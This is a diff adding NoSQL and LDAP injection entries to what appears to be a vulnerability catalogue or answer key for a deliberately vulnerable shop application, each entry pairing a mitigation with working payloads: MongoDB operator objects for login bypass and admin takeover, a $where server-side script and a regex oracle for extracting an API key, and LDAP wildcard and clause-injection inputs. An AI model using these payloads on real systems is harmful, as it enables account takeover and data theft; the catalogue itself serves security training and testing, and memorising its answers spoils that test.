@@ -42,6 +42,55 @@ V-SHOP-003  SQL injection on /admin/users?q=
 
 
 -----------------------------------------------------------------
+NOSQL / LDAP INJECTION
+-----------------------------------------------------------------
+
+V-SHOP-004  NoSQL (MongoDB-shape) injection on /partner/login
+  Location:  routes/partners.js  (req.body username+password used as query
+             conditions -- the handler copies ONLY those two fields)
+  Exploit:   POST /partner/login   (Content-Type: application/json)
+             { "username": { "$ne": null }, "password": { "$ne": null } }
+               -> logs in with NO credentials as the FIRST match:
+                  acme_supply (role=partner). Auth bypass, but NOT admin.
+             { "username": "northwind_ops", "password": { "$gt": "" } }
+               -> become the admin partner northwind_ops (targeted bypass)
+             { "username": { "$regex": "^north" }, "password": { "$ne": null } }
+               -> regex-target the admin (or ^a.. to enumerate blindly)
+             NOTE: $where does NOT work here -- /login only reads username +
+             password; a sibling/nested $where is ignored. Use /partner/find.
+  Data:      partner api_key (pk_live_root_9a2b71f5) + payout_iban exposed.
+  Mitigation: coerce types at the boundary -- String(req.body.username) -- so
+              the driver only ever receives strings, never operator objects.
+
+V-SHOP-005  NoSQL operator injection on /partner/find
+  Location:  routes/partners.js  (arbitrary JSON filter passed to find())
+  Exploit:   POST /partner/find  { "filter": { "role": "admin" } }
+             POST /partner/find  { "filter": { "api_key": { "$regex":
+               "^pk_live_root" } } }   -> blind extraction oracle
+             POST /partner/find  { "filter": { "$where":
+               "this.role=='admin'" } }  -> server-side JS execution ($where
+               is reachable here, on the arbitrary filter, NOT on /login)
+  Mitigation: build the query from a fixed allow-list of fields/operators,
+              and disable $where entirely.
+
+V-SHOP-006  LDAP injection on /staff/login
+  Location:  routes/staff.js  (filter `(&(uid=${uid})(userPassword=${pw}))`)
+  Exploit:   POST /staff/login   uid=admin   password=*
+               -> wildcard password (presence match) logs in as admin
+             POST /staff/login   uid=*       password=*
+               -> matches the first directory entry
+  Mitigation: use a parameterised filter API or RFC-4515 escape
+              `* ( ) \ NUL` in every user value.
+
+V-SHOP-007  LDAP injection on /staff/search
+  Location:  routes/staff.js  (filter `(&(uid=${uid})(employeeType=staff))`)
+  Exploit:   GET /staff/search?uid=*        -> every staff entry
+             GET /staff/search?uid=k*       -> substring enumeration
+             GET /staff/search?uid=*)(uid=* -> injected extra clause
+  Mitigation: escape the value; never let user input add filter syntax.
+
+
+-----------------------------------------------------------------
 CROSS-SITE SCRIPTING
 -----------------------------------------------------------------
 
